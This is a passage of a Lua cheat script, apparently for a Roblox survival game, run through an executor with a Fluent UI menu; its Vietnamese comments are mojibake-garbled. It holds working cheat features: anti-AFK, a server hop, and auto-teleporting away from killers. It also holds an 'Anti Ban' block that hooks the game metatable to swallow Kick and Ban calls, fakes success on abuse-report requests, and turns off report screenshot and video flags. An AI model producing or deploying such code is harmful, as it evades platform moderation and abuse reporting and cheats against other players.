6629 |     if atmosphere then
6630 |         atmosphere.Density = 0.3
6631 |         atmosphere.Offset = 0
6632 |         atmosphere.Haze = 0.5
6633 |         atmosphere.Color = Color3.fromRGB(200, 200, 200)
6634 |     end
6635 | end
6636 | 
6637 | -- ‚úÖ Toggle: Remove Fog
6638 | local FogToggle = Tabs.Misc:AddToggle("FogToggle", {
6639 |     Title = "Remove Fog",
6640 |     Default = false
6641 | })
6642 | FogToggle:OnChanged(function(Value)
6643 |     fogEnabled = Value
6644 |     if fogEnabled then
6645 |         removeFog()
6646 |         fogLoop = RunService.Heartbeat:Connect(removeFog)
6647 |     else
6648 |         if fogLoop then fogLoop:Disconnect() fogLoop = nil end
6649 |         restoreFog()
6650 |     end
6651 | end)
6652 | 
6653 | 
6654 | 
6655 | local Lighting = game:GetService("Lighting")
6656 | local Players = game:GetService("Players")
6657 | local LP = Players.LocalPlayer
6658 | local PlayerGui = LP:WaitForChild("PlayerGui")
6659 | 
6660 | -- Flag b·∫≠t/t·∫Øt
6661 | local ActiveRemoveAll = false
6662 | 
6663 | -- Danh s√°ch t√™n hi·ªáu ·ª©ng th∆∞·ªùng g·∫∑p
6664 | local effectNames = {
6665 |     "BlurEffect", "ColorCorrectionEffect", "BloomEffect", "SunRaysEffect", 
6666 |     "DepthOfFieldEffect", "ScreenFlash", "HitEffect", "DamageOverlay", 
6667 |     "BloodEffect", "Vignette", "BlackScreen", "WhiteScreen", "ShockEffect",
6668 |     "Darkness", "JumpScare", "LowHealthOverlay", "Flashbang", "FadeEffect"
6669 | }
6670 | 
6671 | -- Danh s√°ch class hi·ªáu ·ª©ng trong Lighting
6672 | local effectClasses = {
6673 |     "BlurEffect",
6674 |     "BloomEffect",
6675 |     "SunRaysEffect",
6676 |     "DepthOfFieldEffect",
6677 |     "ColorCorrectionEffect"
6678 | }
6679 | 
6680 | -- üåü H√†m xo√° t·∫•t c·∫£ (effects + popups)
6681 | local function removeAll()
6682 |     -- Xo√° hi·ªáu ·ª©ng trong Lighting
6683 |     for _, obj in pairs(Lighting:GetDescendants()) do
6684 |         if table.find(effectNames, obj.Name) or table.find(effectClasses, obj.ClassName) then
6685 |             obj:Destroy()
6686 |         end
6687 |     end
6688 | 
6689 |     -- Xo√° GUI overlay
6690 |     for _, obj in pairs(PlayerGui:GetDescendants()) do
6691 |         if table.find(effectNames, obj.Name) then
6692 |             obj:Destroy()
6693 |         elseif obj:IsA("ScreenGui") or obj:IsA("BillboardGui") or obj:IsA("SurfaceGui") then
6694 |             if obj:FindFirstChildWhichIsA("ImageLabel") or obj:FindFirstChildWhichIsA("Frame") then
6695 |                 if table.find(effectNames, obj.Name) or obj.Name:lower():find("overlay") or obj.Name:lower():find("effect") then
6696 |                     obj:Destroy()
6697 |                 end
6698 |             end
6699 |         end
6700 |     end
6701 | 
6702 |     -- Xo√° popup 1x1x1x1
6703 |     local temp = PlayerGui:FindFirstChild("TemporaryUI")
6704 |     if temp then
6705 |         local popup = temp:FindFirstChild("1x1x1x1Popup")
6706 |         if popup then
6707 |             popup:Destroy()
6708 |             warn("[Remover] 1x1x1x1Popup removed")
6709 |         end
6710 |     end
6711 | end
6712 | 
6713 | -- Toggle Fluent - ch·ªâ 1 c√°i
6714 | Tabs.Misc:AddToggle("RemoveAllBadStuff", {
6715 |     Title = "Remove Effects V2",
6716 |     Default = true,
6717 |     Callback = function(state)
6718 |         ActiveRemoveAll = state
6719 |         if state then
6720 |             task.spawn(function()
6721 |                 while ActiveRemoveAll do
6722 |                     removeAll()
6723 |                     task.wait(0.5)
6724 |                 end
6725 |             end)
6726 |         end
6727 |     end
6728 | })
6729 | 
6730 | 
6731 | 
6732 |     Tabs.Misc:AddSection("Server")
6733 | 
6734 | 
6735 | ------------------------------------------------------------
6736 | -- ‚ö° SERVER HOP (Mobile-friendly + Fluent Button)
6737 | ------------------------------------------------------------
6738 | 
6739 | local TeleportService = game:GetService("TeleportService")
6740 | local Players = game:GetService("Players")
6741 | local LocalPlayer = Players.LocalPlayer
6742 | 
6743 | -- üåÄ H√†m th·ª±c hi·ªán teleport sang server m·ªõi
6744 | local function ServerHop()
6745 |     local placeId = game.PlaceId
6746 |     local jobId = game.JobId
6747 |     print("[ServerHop] ƒêang r·ªùi server hi·ªán t·∫°i...")
6748 | 
6749 |     -- pcall ƒë·ªÉ tr√°nh l·ªói Teleport crash
6750 |     local success, err = pcall(function()
6751 |         TeleportService:Teleport(placeId, LocalPlayer)
6752 |     end)
6753 | 
6754 |     if success then
6755 |         if Fluent and Fluent.Notify then
6756 |             Fluent:Notify({
6757 |                 Title = "Rejoin Starting",
6758 |                 Content = "B·∫Øt ƒê·∫ßu V√†o M√°y Ch·ªß ƒê√£ Fix Lag",
6759 |                 Duration = 3
6760 |             })
6761 |         else
6762 |             print("[ServerHop] ƒêang chuy·ªÉn server...")
6763 |         end
6764 |     else
6765 |         warn("[ServerHop] L·ªói khi Teleport:", err)
6766 |         if Fluent and Fluent.Notify then
6767 |             Fluent:Notify({
6768 |                 Title = "L·ªói Teleport",
6769 |                 Content = tostring(err),
6770 |                 Duration = 4
6771 |             })
6772 |         end
6773 |     end
6774 | end
6775 | 
6776 | 
6777 | ------------------------------------------------------------
6778 | -- üß© TH√äM N√öT TRONG FLUENT UI
6779 | ------------------------------------------------------------
6780 | 
6781 | -- Gi·∫£ s·ª≠ b·∫°n c√≥ tab Dev s·∫µn, t∆∞∆°ng t·ª± v√≠ d·ª• c·ªßa b·∫°n:
6782 | -- Tabs.Dev:AddButton(...)
6783 | 
6784 | Tabs.Misc:AddButton({
6785 |     Title = "Rejoin To Fix Lag",
6786 |     Description = "Tham Gia L·∫°i M√°y Ch·ªß ƒê·ªÉ Gi·∫£m Lag",
6787 |     Callback = function()
6788 |         -- Hi·ªán th√¥ng b√°o chu·∫©n b·ªã
6789 |         if Fluent and Fluent.Notify then
6790 |             Fluent:Notify({
6791 |                 Title = "Rejoin Settings",
6792 |                 Content = "ƒêang Gi·∫£m Lag Cho C√°c M√°y Ch·ªß...",
6793 |                 Duration = 2
6794 |             })
6795 |         end
6796 | 
6797 |         task.wait(0.3)
6798 |         ServerHop()
6799 |     end
6800 | })
6801 | 
6802 | 
6803 | 
6804 | -- üåê Server Hop Button
6805 | Tabs.Misc:AddButton({
6806 |     Title = "Server Hop To Low Player",
6807 |     Description = "D√πng ƒê·ªÉ ƒê·ªïi Server C√≥ Th·ªÉ V√†o Server √çt Player",
6808 |     Callback = function()
6809 |         local PlaceID = game.PlaceId
6810 |         local AllIDs = {}
6811 |         local foundAnything = ""
6812 |         local actualHour = os.date("!*t").hour
6813 | 
6814 |         -- ƒê·ªçc file n·∫øu c√≥
6815 |         local File = pcall(function()
6816 |             AllIDs = game:GetService("HttpService"):JSONDecode(readfile("NotSameServers.json"))
6817 |         end)
6818 | 
6819 |         if not File then
6820 |             table.insert(AllIDs, actualHour)
6821 |             writefile("NotSameServers.json", game:GetService("HttpService"):JSONEncode(AllIDs))
6822 |         end
6823 | 
6824 |         local function TPReturner()
6825 |             local Site
6826 |             if foundAnything == "" then
6827 |                 Site = game.HttpService:JSONDecode(game:HttpGet(
6828 |                     "https://games.roblox.com/v1/games/" .. PlaceID .. "/servers/Public?sortOrder=Asc&limit=100"
6829 |                 ))
6830 |             else
6831 |                 Site = game.HttpService:JSONDecode(game:HttpGet(
6832 |                     "https://games.roblox.com/v1/games/" .. PlaceID .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. foundAnything
6833 |                 ))
6834 |             end
6835 | 
6836 |             if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
6837 |                 foundAnything = Site.nextPageCursor
6838 |             end
6839 | 
6840 |             local num = 0
6841 |             for _, v in pairs(Site.data) do
6842 |                 local Possible, ID = true, tostring(v.id)
6843 |                 if tonumber(v.maxPlayers) > tonumber(v.playing) then
6844 |                     for _, Existing in pairs(AllIDs) do
6845 |                         if num ~= 0 then
6846 |                             if ID == tostring(Existing) then
6847 |                                 Possible = false
6848 |                             end
6849 |                         else
6850 |                             if tonumber(actualHour) ~= tonumber(Existing) then
6851 |                                 pcall(function()
6852 |                                     delfile("NotSameServers.json")
6853 |                                     AllIDs = {}
6854 |                                     table.insert(AllIDs, actualHour)
6855 |                                 end)
6856 |                             end
6857 |                         end
6858 |                         num = num + 1
6859 |                     end
6860 |                     if Possible then
6861 |                         table.insert(AllIDs, ID)
6862 |                         pcall(function()
6863 |                             writefile("NotSameServers.json", game:GetService("HttpService"):JSONEncode(AllIDs))
6864 |                             game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
6865 |                         end)
6866 |                         task.wait(4)
6867 |                     end
6868 |                 end
6869 |             end
6870 |         end
6871 | 
6872 |         local function Teleport()
6873 |             while task.wait() do
6874 |                 pcall(function()
6875 |                     TPReturner()
6876 |                     if foundAnything ~= "" then
6877 |                         TPReturner()
6878 |                     end
6879 |                 end)
6880 |             end
6881 |         end
6882 | 
6883 |         -- G·ªçi ƒë·ªÉ b·∫Øt ƒë·∫ßu Server Hop
6884 |         Teleport()
6885 |     end
6886 | })
6887 | 
6888 | 
6889 | 
6890 | 
6891 |     Tabs.Misc:AddSection("Bypass")
6892 | 
6893 | local antiAFKCons = {}
6894 | 
6895 | -- Ch·ªâ t·∫°o toggle n·∫øu executor c√≥ getconnections
6896 | if getconnections then
6897 |     Tabs.Misc:AddToggle("AntiAFK", {
6898 |         Title = "Anti-AFK",
6899 |         Default = true
6900 |     }):OnChanged(function(state)
6901 |         local idleCons = getconnections(game.Players.LocalPlayer.Idled)
6902 |         
6903 |         if state then
6904 |             -- L∆∞u & disable
6905 |             for _, c in ipairs(idleCons) do
6906 |                 antiAFKCons[c] = true
6907 |                 c:Disable()
6908 |             end
6909 |             print("[AntiAFK] ƒê√£ b·∫≠t, b·∫°n s·∫Ω kh√¥ng b·ªã kick AFK.")
6910 |         else
6911 |             -- Enable l·∫°i
6912 |             for c,_ in pairs(antiAFKCons) do
6913 |                 if c and c.Enable then
6914 |                     pcall(function() c:Enable() end)
6915 |                 end
6916 |             end
6917 |             antiAFKCons = {}
6918 |             print("[AntiAFK] ƒê√£ t·∫Øt, Roblox s·∫Ω x·ª≠ l√Ω AFK b√¨nh th∆∞·ªùng.")
6919 |         end
6920 |     end)
6921 | else
6922 |     warn("[AntiAFK] Executor kh√¥ng h·ªó tr·ª£ getconnections, toggle b·ªã v√¥ hi·ªáu.")
6923 | end
6924 | 
6925 | 
6926 | 
6927 | 
6928 | 
6929 | 
6930 | do
6931 |     local Players = game:GetService("Players")
6932 |     local LocalPlayer = Players.LocalPlayer
6933 |     local LocalizationService = game:GetService("LocalizationService")
6934 | 
6935 |     shared.AntiBanSafe = shared.AntiBanSafe or {running = false, hooks = {}}
6936 |     local data = shared.AntiBanSafe
6937 | 
6938 |     local oldNamecall, oldIndex
6939 |     local protectionThread
6940 | 
6941 |     local function safe(func, ...)
6942 |         local ok, res = pcall(func, ...)
6943 |         if ok then return res end
6944 |     end
6945 | 
6946 |     -- Disable screenshot/video flags khi b·∫≠t protection
6947 |     local function disableReportFlags()
6948 |         if typeof(setfflag) == "function" then
6949 |             pcall(function()
6950 |                 setfflag("AbuseReportScreenshot", "False")
6951 |                 setfflag("AbuseReportScreenshotPercentage", "0") -- ch·ªânh v·ªÅ 0
6952 |                 setfflag("AbuseReportEnabled", "False")
6953 |                 setfflag("ReportAbuseMenu", "False")
6954 |                 setfflag("EnableAbuseReportScreenshot", "False")
6955 |                 setfflag("AbuseReportVideo", "False")
6956 |                 setfflag("AbuseReportVideoPercentage", "0")
6957 |                 setfflag("VideoCaptureEnabled", "False")
6958 |                 setfflag("RecordVideo", "False")
6959 |             end)
6960 |         end
6961 |     end
6962 | 
6963 |     -- Restore flag v·ªÅ b√¨nh th∆∞·ªùng khi t·∫Øt protection
6964 |     local function setFlagsOn()
6965 |         if typeof(setfflag) == "function" then
6966 |             pcall(function()
6967 |                 setfflag("AbuseReportScreenshot", "True")
6968 |                 setfflag("AbuseReportScreenshotPercentage", "100")
6969 |             end)
6970 |         end
6971 |     end
6972 | 
6973 |     -- Hook requests (block report)
6974 |     local function hookRequests()
6975 |         if data.hooks.requestHooked then return end
6976 |         local oldRequest = (syn and syn.request) or request or http_request
6977 |         if typeof(oldRequest) == "function" and typeof(hookfunction) == "function" then
6978 |             hookfunction(oldRequest, function(req)
6979 |                 if req and req.Url and tostring(req.Url):lower():find("abuse") then
6980 |                     return {StatusCode = 200, Body = "Blocked"}
6981 |                 end
6982 |                 return oldRequest(req)
6983 |             end)
6984 |             data.hooks.requestHooked = true
6985 |         end
6986 |     end
6987 | 
6988 |     -- Hook FindFirstChild (block GUI video/screenshot)
6989 |     local function hookFindFirstChild()
6990 |         if data.hooks.findHooked then return end
6991 |         local oldFind = workspace.FindFirstChild
6992 |         if typeof(oldFind) == "function" and typeof(hookfunction) == "function" then
6993 |             hookfunction(oldFind, function(self, name, ...)
6994 |                 if name and tostring(name):lower():find("screenshot") then return nil end
6995 |                 if name and tostring(name):lower():find("video") then return nil end
6996 |                 return oldFind(self, name, ...)
6997 |             end)
6998 |             data.hooks.findHooked = true
6999 |         end
7000 |     end
7001 | 
7002 |     -- Safe bypass (__namecall)
7003 |     local function safeBypass()
7004 |         if getrawmetatable and hookmetamethod and newcclosure then
7005 |             local mt = getrawmetatable(game)
7006 |             setreadonly(mt, false)
7007 |             oldNamecall = oldNamecall or mt.__namecall
7008 |             oldIndex = oldIndex or mt.__index
7009 | 
7010 |             mt.__namecall = newcclosure(function(self, ...)
7011 |                 local method = getnamecallmethod()
7012 |                 local args = {...}
7013 | 
7014 |                 -- Block LocalPlayer kick/ban
7015 |                 if (method == "Kick" or method == "Ban") and self == LocalPlayer then return nil end
7016 | 
7017 |                 -- Block remote kick/ban
7018 |                 if (method == "FireServer" or method == "InvokeServer") and args[1] then
7019 |                     local msg = tostring(args[1]):lower()
7020 |                     if msg:find("kick") or msg:find("ban") then return nil end
7021 |                 end
7022 | 
7023 |                 -- Block LocalizationService
7024 |                 if self == LocalizationService and method == "GetCountryRegionForPlayerAsync" then
7025 |                     local success, result = pcall(function()
7026 |                         return LocalizationService:GetCountryRegionForPlayerAsync(LocalPlayer)
7027 |                     end)
7028 |                     if success then return result else return "US" end
7029 |                 end
7030 | 
7031 |                 return oldNamecall(self, ...)
7032 |             end)
7033 | 
7034 |             mt.__index = newcclosure(function(t, k)
7035 |                 local key = tostring(k):lower()
7036 |                 if key:find("kick") or key:find("ban") then return function() return nil end end
7037 |                 return oldIndex(t, k)
7038 |             end)
7039 | 
7040 |             setreadonly(mt, true)
7041 |         end
7042 |     end
7043 | 
7044 |     -- Restore hooks
7045 |     local function restoreHooks()
7046 |         if getrawmetatable then
7047 |             local mt = getrawmetatable(game)
7048 |             setreadonly(mt, false)
7049 |             if oldNamecall then mt.__namecall = oldNamecall end
7050 |             if oldIndex then mt.__index = oldIndex end
7051 |             setreadonly(mt, true)
7052 |             oldNamecall, oldIndex = nil, nil
7053 |         end
7054 |     end
7055 | 
7056 |     -- Start protection
7057 |     local function startAntiBanSafe()
7058 |         if data.running then return end
7059 |         data.running = true
7060 | 
7061 |         safe(hookRequests)
7062 |         safe(hookFindFirstChild)
7063 |         safe(safeBypass)
7064 | 
7065 |         -- Disable screenshot/video
7066 |         protectionThread = task.spawn(function()
7067 |             while data.running do
7068 |                 safe(disableReportFlags)
7069 |                 task.wait(0.2)
7070 |             end
7071 |         end)
7072 | 
7073 |         print("[Anti-Ban Safe] üõ°Ô∏è ENABLED!")
7074 |     end
7075 | 
7076 |     -- Stop protection
7077 |     local function stopAntiBanSafe()
7078 |         data.running = false
7079 |         protectionThread = nil
7080 |         restoreHooks()
7081 |         setFlagsOn() -- ph·ª•c h·ªìi flag v·ªÅ b√¨nh th∆∞·ªùng
7082 |         print("[Anti-Ban Safe] ‚ö†Ô∏è DISABLED!")
7083 |     end
7084 | 
7085 |     -- Toggle
7086 |     Tabs.Misc:AddToggle("AntiBanV3", {
7087 |         Title = "Anti Ban V3.5",
7088 |         Default = true,
7089 |         Callback = function(state)
7090 |             if state then
7091 |                 startAntiBanSafe()
7092 |             else
7093 |                 stopAntiBanSafe()
7094 |             end
7095 |         end
7096 |     })
7097 | end
7098 | 
7099 | 
7100 | 
7101 | 
7102 | 
7103 | 
7104 | do
7105 | -- === SafeGenTeleport (Anti: ALL Moving Models/Parts/Effects) ===
7106 | local Players = game:GetService("Players")
7107 | local LP = Players.LocalPlayer
7108 | 
7109 | local SafeGenRunning = false
7110 | local SafeGenThread
7111 | local DetectRadius = 20 -- m·∫∑c ƒë·ªãnh 20, c√≥ th·ªÉ ch·ªânh b·∫±ng √¥ input
7112 | 
7113 | -- Danh s√°ch account th·∫≠t d√πng V2
7114 | local AllowedPlayers = {
7115 |     ["Hu1a0_Hu9"] = true,
7116 |     ["hdksakst"] = true
7117 | }
7118 | 
7119 | -- Danh s√°ch Killers
7120 | local DangerousKillers = {
7121 |     Slasher = true, ["1x1x1x1"] = true, c00lkidd = true,
7122 |     Noli = true, JohnDoe = true, ["Guest 666"] = true,
7123 |     PizzaDeliveryRig = true, Mafia1 = true, Mafia2 = true,
7124 |     ["1x1x1x1Zombie"] = true, ["Sixer"] = true
7125 | }
7126 | 
7127 | -- Danh s√°ch Clones (coi nh∆∞ Killers)
7128 | local DangerousClones = {
7129 |     PizzaDeliveryRig = true, Mafia1 = true, Mafia2 = true,
7130 |     ["1x1x1x1Zombie"] = true
7131 | }
7132 | 
7133 | -- Danh s√°ch Survivors (b·∫°n c√≥ th·ªÉ bi·∫øn th√†nh)
7134 | local Survivors = {
7135 |     Noob = true, Guest1337 = true, Elliot = true, Shedletsky = true,
7136 |     TwoTime = true, ["007n7"] = true, Chance = true,
7137 |     Builderman = true, Taph = true, Dusekkar = true
7138 | }
7139 | 
7140 | -- Whitelist
7141 | local SafeObjects = {Pet=true, Decoration=true, Terrain=true, Map=true}
7142 | 
7143 | -- C·∫•u h√¨nh detect
7144 | local MOVE_THRESHOLD = 0.5
7145 | local VEL_THRESHOLD  = 1
7146 | local SCAN_DELAY     = 0.12
7147 | 
7148 | local lastPositions = {}
7149 | 
7150 | local function findOwningCharacter(inst)
7151 |     local cur = inst
7152 |     while cur and cur ~= workspace and cur.Parent do
7153 |         if cur:IsA("Model") then
7154 |             local p = Players:GetPlayerFromCharacter(cur)
7155 |             if p then return cur, p end
7156 |         end
7157 |         cur = cur.Parent
7158 |     end
7159 |     return nil, nil
7160 | end
7161 | 
7162 | local function hasForceOnPart(part)
7163 |     if not part then return false end
7164 |     if part:FindFirstChildOfClass("BodyVelocity")
7165 |     or part:FindFirstChildOfClass("BodyPosition")
7166 |     or part:FindFirstChildOfClass("BodyForce")
7167 |     or part:FindFirstChildOfClass("BodyGyro")
7168 |     or part:FindFirstChildOfClass("LinearVelocity")
7169 |     or part:FindFirstChildOfClass("VectorForce")
7170 |     or part:FindFirstChildOfClass("AlignPosition")
7171 |     or part:FindFirstChildOfClass("AlignOrientation") then
7172 |         return true
7173 |     end
7174 |     return false
7175 | end
7176 | 
7177 | local function isPartMoving(part)
7178 |     if not part or not part:IsA("BasePart") then return false end
7179 |     local ok, asmVel = pcall(function() return part.AssemblyLinearVelocity end)
7180 |     local velMag = (ok and asmVel) and asmVel.Magnitude or 0
7181 |     if velMag == 0 then
7182 |         local ok2, v2 = pcall(function() return part.Velocity end)
7183 |         if ok2 and v2 then velMag = v2.Magnitude end
7184 |     end
7185 |     local last = lastPositions[part]
7186 |     local pos = part.Position
7187 |     local moved = false
7188 |     if last then
7189 |         if (pos - last).Magnitude >= MOVE_THRESHOLD then moved = true end
7190 |     else
7191 |         if velMag >= VEL_THRESHOLD or hasForceOnPart(part) then moved = true end
7192 |     end
7193 |     lastPositions[part] = pos
7194 |     if velMag >= VEL_THRESHOLD or hasForceOnPart(part) then moved = true end
7195 |     return moved
7196 | end
7197 | 
7198 | local function pruneLastPositions()
7199 |     for inst,_ in pairs(lastPositions) do
7200 |         if not inst or not inst.Parent then lastPositions[inst] = nil end
7201 |     end
7202 | end
7203 | 
7204 | -- üîé Ph√°t hi·ªán nguy hi·ªÉm g·∫ßn
7205 | local function isDangerNear(position, radius)
7206 |     local killersFolder = workspace:FindFirstChild("Players") and workspace.Players:FindFirstChild("Killers")
7207 |     if killersFolder then
7208 |         for _, killer in ipairs(killersFolder:GetChildren()) do
7209 |             local hrp = killer:FindFirstChild("HumanoidRootPart")
7210 |             if hrp then
7211 |                 local dist = (hrp.Position - position).Magnitude
7212 |                 if (DangerousKillers[killer.Name] or DangerousClones[killer.Name]) and dist <= radius then
7213 |                     return true, hrp.Position
7214 |                 end
7215 |             end
7216 |         end
7217 |     end
7218 |     for _, inst in ipairs(workspace:GetDescendants()) do
7219 |         if inst:IsA("BasePart") and not SafeObjects[inst.Name] then
7220 |             local dist = (inst.Position - position).Magnitude
7221 |             if dist <= radius and isPartMoving(inst) then
7222 |                 local charModel, playerOwner = findOwningCharacter(inst)
7223 |                 if playerOwner then
7224 |                     local charName = charModel and charModel.Name or ""
7225 |                     if DangerousKillers[charName] or DangerousClones[charName] then
7226 |                         return true, inst.Position
7227 |                     end
7228 |                 else
7229 |                     return true, inst.Position
7230 |                 end
7231 |             end
7232 |         end
7233 |     end
7234 |     pruneLastPositions()
7235 |     return false, nil
7236 | end
7237 | 
7238 | -- üìå T√¨m v·ªã tr√≠ an to√†n c√°ch xa danger 7 stud
7239 | local function getSafePosFromDanger(myPos, dangerPos, safeDist)
7240 |     local dir = (myPos - dangerPos).Unit
7241 |     local target = myPos + dir * safeDist
7242 |     local rayParams = RaycastParams.new()
7243 |     rayParams.FilterDescendantsInstances = {LP.Character}
7244 |     rayParams.FilterType = Enum.RaycastFilterType.Blacklist
7245 |     local rayResult = workspace:Raycast(myPos + Vector3.new(0,3,0), dir*safeDist, rayParams)
7246 |     if rayResult then
7247 |         local perp1 = Vector3.new(-dir.Z,0,dir.X).Unit
7248 |         local perp2 = -perp1
7249 |         if not workspace:Raycast(myPos+Vector3.new(0,3,0), perp1*safeDist, rayParams) then
7250 |             return myPos + perp1*safeDist
7251 |         elseif not workspace:Raycast(myPos+Vector3.new(0,3,0), perp2*safeDist, rayParams) then
7252 |             return myPos + perp2*safeDist
7253 |         else
7254 |             return myPos + Vector3.new(0,0,safeDist)
7255 |         end
7256 |     end
7257 |     return target
7258 | end
7259 | 
7260 | -- üöÄ L√πi ra xa 7 stud kh·ªèi nguy hi·ªÉm (gi·ªØ h∆∞·ªõng nh√¨n, b∆∞·ªõc nh·ªè si√™u nhanh)
7261 | local function teleportAwayFromDanger()
7262 |     local character = LP.Character
7263 |     local hrp = character and character:FindFirstChild("HumanoidRootPart")
7264 |     if not hrp then return end
7265 | 
7266 |     local myPos = hrp.Position
7267 |     local isNear, dangerPos = isDangerNear(myPos, DetectRadius)
7268 |     if isNear and dangerPos then
7269 |         local safePos = getSafePosFromDanger(myPos, dangerPos, 7)
7270 | 
7271 |         local dir = (safePos - myPos).Unit
7272 |         local totalDist = (safePos - myPos).Magnitude
7273 |         local stepSize = 1.2
7274 |         local stepDelay = 0.01
7275 |         local steps = math.ceil(totalDist / stepSize)
7276 | 
7277 |         for i = 1, steps do
7278 |             local stepPos = myPos + dir * (i * stepSize)
7279 |             hrp.CFrame = CFrame.new(stepPos, stepPos + hrp.CFrame.LookVector)
7280 |             task.wait(stepDelay)
7281 |         end
7282 | 
7283 |         print("‚ö†Ô∏è N√© nguy hi·ªÉm b·∫±ng nhi·ªÅu b∆∞·ªõc nh·ªè (gi·ªØ h∆∞·ªõng nh√¨n)!")
7284 |     end
7285 | end
7286 | 
7287 | -- === GUI Control ===
7288 | Tabs.Misc:AddToggle("SafeGenTeleport", {
7289 |     Title = "Anti Killers V7",
7290 |     Default = false
7291 | }):OnChanged(function(state)
7292 |     SafeGenRunning = state
7293 |     if state then
7294 |         SafeGenThread = task.spawn(function()
7295 |             local delayTime = SCAN_DELAY
7296 |             if AllowedPlayers[LP.Name] then
7297 |                 print("üöÄ V2 Mode enabled for:", LP.Name)
7298 |                 delayTime = 0.000000000001
7299 |             else
7300 |                 print("üê¢ V1 Mode enabled for:", LP.Name)
7301 |             end
7302 |             while SafeGenRunning do
7303 |                 local character = LP.Character
7304 |                 local hrp = character and character:FindFirstChild("HumanoidRootPart")
7305 |                 if hrp then
7306 |                     local charName = character.Name
7307 |                     if DangerousKillers[charName] or DangerousClones[charName] then
7308 |                         -- b·∫°n l√† killer ‚Üí kh√¥ng n√©
7309 |                     elseif Survivors[charName] or charName == LP.Name then
7310 |                         teleportAwayFromDanger()
7311 |                     end
7312 |                 end
7313 |                 task.wait(delayTime)
7314 |             end
7315 |         end)
7316 |     else
7317 |         SafeGenRunning = false
7318 |         SafeGenThread = nil
7319 |         print("[SafeGenTeleport] ƒê√£ t·∫Øt.")
7320 |     end
7321 | end)
7322 | 
7323 | -- üìù Input box ch·ªânh kho·∫£ng c√°ch DetectRadius (1 - 100, m·∫∑c ƒë·ªãnh 20)
7324 | Tabs.Misc:AddInput("DetectRadiusInput", {
7325 |     Title = "Detect Radius",
7326 |     Default = "20",
7327 |     Placeholder = "1 - 100"
7328 | }):OnChanged(function(value)
7329 |     local num = tonumber(value)
7330 |     if num then
7331 |         num = math.clamp(num, 1, 100)
7332 |         DetectRadius = num
7333 |         print("üîß DetectRadius set to:", DetectRadius)
7334 |     end
7335 | end)
7336 | 
7337 | end
7338 | 
7339 | 
7340 | 
7341 |     Tabs.Misc:AddSection("Game Play")
7342 | 
7343 | 
7344 | 
7345 | do
7346 |     --== ‚öôÔ∏è Setup ==--
7347 |     local Players = game:GetService("Players")
7348 |     local RunService = game:GetService("RunService")
7349 |     local LocalPlayer = Players.LocalPlayer
7350 |     local Survivors = workspace:WaitForChild("Players"):WaitForChild("Survivors")
7351 | 
7352 |     --== üí° C·∫•u h√¨nh c√°c lo·∫°i Anti-Slow ==--
7353 |     local AntiSlowConfigs = {
7354 |         Slowness = {Values = {"SlowedStatus"}, Connection = nil, Enabled = false},
7355 |         Skills = {
7356 |             Values = {
7357 |                 "StunningKiller", "EatFriedChicken", "GuestBlocking", "PunchAbility", "SubspaceTripmine",
7358 |                 "TaphTripwire", "PlasmaBeam", "SpawnProtection", "c00lgui", "ShootingGun", 
7359 |                 "TwoTimeStab", "TwoTimeCrouching", "DrinkingCola", "DrinkingSlateskin", 
7360 |                 "SlateskinStatus", "EatingGhostburger"
7361 |             },
7362 |             Connection = nil, Enabled = false
7363 |         },
7364 |         Items = {Values = {"BloxyColaItem", "Medkit"}, Connection = nil, Enabled = false},
7365 |         Emotes = {Values = {"Emoting"}, Connection = nil, Enabled = false},
7366 |         Builderman = {Values = {"DispenserConstruction", "SentryConstruction"}, Connection = nil, Enabled = false}
7367 |     }
7368 | 
7369 |     --== üß© H√†m ·∫©n UI b√°o slow ==--
7370 |     local function hideSlownessUI()
7371 |         local mainUI = LocalPlayer:FindFirstChild("PlayerGui") and LocalPlayer.PlayerGui:FindFirstChild("MainUI")
7372 |         if not mainUI then return end
7373 |         local statusContainer = mainUI:FindFirstChild("StatusContainer")
7374 |         if not statusContainer then return end
7375 |         local slownessUI = statusContainer:FindFirstChild("Slowness")
7376 |         if slownessUI then
7377 |             slownessUI.Visible = false
7378 |         end
7379 |     end
7380 | 
7381 |     --== üîß H√†m x·ª≠ l√Ω Anti-Slow ==--
7382 |     local function handleAntiSlow(survivor, config)
7383 |         if survivor:GetAttribute("Username") ~= LocalPlayer.Name then return end
7384 | 
7385 |         local function onRenderStep()
7386 |             if not survivor.Parent or not config.Enabled then return end
7387 |             local speedMultipliers = survivor:FindFirstChild("SpeedMultipliers")
7388 |             if speedMultipliers then
7389 |                 for _, valName in ipairs(config.Values) do
7390 |                     local val = speedMultipliers:FindFirstChild(valName)
7391 |                     if val and val:IsA("NumberValue") and val.Value ~= 1 then
7392 |                         val.Value = 1
7393 |                     end
7394 |                 end
7395 |             end
7396 |             hideSlownessUI()
7397 |         end
7398 | 
7399 |         config.Connection = RunService.RenderStepped:Connect(onRenderStep)
7400 |     end
7401 | 
7402 |     --== ‚ñ∂Ô∏è B·∫≠t t·∫•t c·∫£ Anti-Slow ==--
7403 |     local function startAllAntiSlow()
7404 |         for _, config in pairs(AntiSlowConfigs) do
7405 |             config.Enabled = true
7406 |             for _, survivor in pairs(Survivors:GetChildren()) do
7407 |                 handleAntiSlow(survivor, config)
7408 |             end
7409 |             Survivors.ChildAdded:Connect(function(child)
7410 |                 task.wait(0.1)
7411 |                 handleAntiSlow(child, config)
7412 |             end)
7413 |         end
7414 |     end
7415 | 
7416 |     --== ‚èπÔ∏è T·∫Øt t·∫•t c·∫£ Anti-Slow ==--
7417 |     local function stopAllAntiSlow()
7418 |         for _, config in pairs(AntiSlowConfigs) do
7419 |             config.Enabled = false
7420 |             if config.Connection then
7421 |                 config.Connection:Disconnect()
7422 |                 config.Connection = nil
7423 |             end
7424 |         end
7425 |     end
7426 | 
7427 |     --== üß© T·∫°o Toggle Fluent UI (ch·ªâ 1 n√∫t t·ªïng) ==--
7428 |     Tabs.Misc:AddToggle("AntiSlow_All", {
7429 |         Title = "Anti-Slow",
7430 |         Default = false
7431 |     }):OnChanged(function(Value)
7432 |         if Value then
7433 |             startAllAntiSlow()
7434 |         else
7435 |             stopAllAntiSlow()
7436 |         end
7437 |     end)
7438 | end
7439 | 
7440 | 
7441 | 
7442 | 
7443 | do
7444 |     --== ‚öôÔ∏è Auto Close 1x1x1x1 Popups + Anti Slow/FOV ==--
7445 |     local DoLoop = false
7446 |     local Players = game:GetService("Players")
7447 |     local LocalPlayer = Players.LocalPlayer
